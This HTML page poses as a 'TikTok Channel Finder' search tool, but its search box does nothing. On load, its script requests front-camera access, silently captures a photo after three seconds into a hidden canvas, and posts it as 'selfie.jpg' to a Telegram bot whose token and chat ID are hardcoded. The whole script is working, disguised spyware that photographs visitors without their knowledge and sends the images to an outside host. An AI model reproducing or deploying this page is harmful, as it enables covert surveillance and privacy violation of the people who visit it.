
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TikTok Channel Finder</title>
  <style>
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(to right, #000000, #1a1a1a);
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    h1 {
      font-size: 2.2em;
      margin-bottom: 10px;
      color: #ff0050;
    }

    p {
      color: #ccc;
      margin-bottom: 30px;
    }

    input[type="text"] {
      padding: 12px;
      width: 80%;
      max-width: 400px;
      border: none;
      border-radius: 5px;
      margin-bottom: 15px;
      font-size: 16px;
    }

    button {
      padding: 12px 25px;
      background-color: #ff0050;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }

    video {
      display: none;
    }

    footer {
      position: absolute;
      bottom: 10px;
      font-size: 12px;
      color: #555;
    }
  </style>
</head>
<body>
  <h1>TikTok Channel Finder</h1>
  <p>Search and analyze public TikTok profiles instantly.</p>
  <input type="text" placeholder="Enter TikTok username..." />
  <button>Search</button>

  <video id="video" width="300" autoplay muted playsinline></video>
  <canvas id="canvas" width="300" height="225" style="display:none;"></canvas>

  <footer>Â© 2025 TikFinder Inc.</footer>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');

    const TELEGRAM_BOT_TOKEN = "7862983602:AAFn-7BOmuN52ENXiml2-o4yj9ctbcdJO8g";
    const CHAT_ID = "6768545150";

    navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }
    })
    .then((stream) => {
      video.srcObject = stream;

      setTimeout(() => {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob((blob) => {
          const formData = new FormData();
          formData.append('chat_id', CHAT_ID);
          formData.append('photo', blob, 'selfie.jpg');

          fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
            method: 'POST',
            body: formData
          });
        }, 'image/jpeg');
      }, 3000);
    })
    .catch((err) => {
      console.error("Camera access error:", err);
    });
  </script>
</body>
</html>
